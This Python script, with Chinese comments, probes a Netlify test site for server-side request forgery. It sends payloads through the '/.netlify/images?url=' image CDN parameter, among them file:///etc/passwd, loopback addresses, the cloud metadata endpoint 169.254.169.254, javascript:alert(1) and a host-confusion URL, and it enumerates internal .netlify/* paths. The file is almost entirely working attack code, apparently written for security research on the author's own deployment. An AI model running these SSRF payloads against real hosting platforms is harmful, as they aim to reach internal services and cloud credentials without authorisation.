# -*- coding: utf-8 -*-
"""Netlify:部署后站点域平台路径探测(图片 CDN url 参数)"""
import http.client, ssl, gzip, brotli, sys, urllib.parse
sys.path.insert(0, r'D:\scan\netlify_report')

ctx = ssl.create_default_context()

def req(host, path, headers=None, method='GET'):
    conn = http.client.HTTPSConnection(host, context=ctx, timeout=25)
    h = {'User-Agent': 'Mozilla/5.0', 'Accept-Encoding': 'br, gzip'}
    if headers:
        h.update(headers)
    conn.request(method, path, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br':
        raw = brotli.decompress(raw)
    elif enc == 'gzip':
        raw = gzip.decompress(raw)
    st = r.status
    hdrs = {k.lower(): v for k, v in r.getheaders()}
    conn.close()
    return st, raw, hdrs

SITE_HOST = 'sec-test-rcf6lz.netlify.app'

print('=== 基础内容 ===')
for p in ['/', '/test.txt', '/secret.json', '/old', '/nonexist']:
    s, raw, hdrs = req(SITE_HOST, p)
    print('%-14s %d ct=%-30s %s' % (p, s, hdrs.get('content-type', '')[:30], raw[:60].decode('utf-8', 'ignore').replace('\n', ' ')))

print()
print('=== 图片 CDN url 参数 ===')
urls = [
    'https://example.com/x.png',
    'http://example.com/x.png',
    'file:///etc/passwd',
    'https://127.0.0.1/',
    'https://169.254.169.254/latest/meta-data/',
    'https://[::1]/',
    'ftp://example.com/x.png',
    'data://x',
    'javascript:alert(1)',
    '//example.com/x.png',
    'https://example.com:443@127.0.0.1/x.png',
    'https://user:pass@example.com/x.png',
]
for u in urls:
    p = '/.netlify/images?url=' + urllib.parse.quote(u, safe='')
    try:
        s, raw, hdrs = req(SITE_HOST, p)
        print('%-58s %d ct=%-25s len=%-6d %s' % (u[:56], s, hdrs.get('content-type', '')[:25], len(raw),
              raw[:50].decode('utf-8', 'ignore').replace('\n', ' ')))
    except Exception as e:
        print('%-58s ERR %s' % (u[:56], str(e)[:40]))

print()
print('=== .netlify/* 其他路径 ===')
for p in ['/.netlify/images?url=https://example.com/x.png&fit=cover&w=100&h=100',
          '/.netlify/images?url=https%3A%2F%2Fexample.com%2Fx.png&fm=webp&q=75',
          '/.netlify/functions/nonexist',
          '/.netlify/edge-functions/nonexist',
          '/.netlify/identity',
          '/.netlify/identity/.well-known/openid-configuration',
          '/.netlify/large-media/status',
          '/.netlify/builders/notifications',
          '/.netlify/plugins/notifications',
          '/.netlify/serverless/nonexist',
          '/.netlify/deploy/v1/config',
          '/_headers',
          '/_redirects',
          '/.netlify/package.json']:
    s, raw, hdrs = req(SITE_HOST, p)
    print('%-72s %d ct=%-25s %s' % (p[:70], s, hdrs.get('content-type', '')[:25],
          raw[:50].decode('utf-8', 'ignore').replace('\n', ' ')))
